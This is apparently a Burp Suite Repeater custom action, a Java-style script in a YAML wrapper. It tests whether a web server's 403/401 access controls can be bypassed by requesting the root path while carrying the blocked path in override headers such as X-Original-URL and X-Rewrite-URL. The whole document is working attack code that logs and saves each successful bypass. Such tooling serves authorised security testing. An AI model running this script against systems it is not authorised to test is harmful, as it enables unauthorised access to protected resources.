id: b089c2e1-45f8-4b7b-9c6d-bypass-url-001
name: 403/401 Bypass - URL Override Headers
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - URL Override Headers
  // Tests bypass using X-Original-URL, X-Rewrite-URL, and similar headers
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  
  String[] URL_OVERRIDE_HEADERS = {
      "X-Original-URL", "X-Original-Url", "X-Rewrite-URL", "X-Rewrite-Url",
      "X-Override-URL", "X-Override-Url", "X-Proxy-URL", "X-Proxy-Url",
      "X-HTTP-DestinationURL", "X-Http-Destinationurl", "Request-Uri",
      "X-Request-Uri", "Uri", "Url", "Path", "Destination", "Redirect",
      "Referer", "X-Referrer", "Content-Location"
  };
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  var originalPath = originalRequest.path();
  int originalStatus = requestResponse.response().statusCode();
  
  logging.logToOutput("=== 403/401 Bypass - URL Override Headers ===");
  logging.logToOutput("Target: " + httpService.host() + originalPath);
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
  
  for (String header : URL_OVERRIDE_HEADERS) {
      try {
          // Request to root with original path in header
          var req = originalRequest.withPath("/").withHeader(header, originalPath);
          var resp = api.http().sendRequest(req);
          Thread.sleep(DELAY_MS);
          
          int status = resp.response().statusCode();
          String note = header + ": " + originalPath + " (path=/) -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              success++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
              rr.annotations().setNotes("URL Override Bypass: " + note);
              api.organizer().sendToOrganizer(rr);
          } else if (VERBOSE) {
              logging.logToOutput("[-] " + note);
          }
          total++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
